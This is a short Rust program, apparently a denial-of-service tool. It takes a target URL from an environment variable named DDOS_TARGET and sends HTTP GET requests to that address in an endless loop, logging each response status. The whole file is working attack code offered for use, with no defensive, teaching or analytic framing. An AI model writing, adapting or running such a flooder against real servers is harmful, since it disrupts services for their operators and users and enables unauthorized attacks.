#![allow(unused_must_use)]

use reqwest::Client;

#[tokio::main]
async fn main() {
    let target: String;
    let mut i: i64 = 1;

    if let Ok(env) = std::env::var("DDOS_TARGET") {
        target = env;
    } else {
        println!("DDOS_TARGET not set");
        std::process::exit(1);
    }

    let http_client = Client::new();

    loop {
        println!("{} | Sending request to {}", i, &target);
        i += 1;

        let request = http_client.get(&target).send().await;

        if let Ok(response) = request {
            println!("Response: {}", response.status());
        } else {
            println!("Request failed");
        }
    }
}
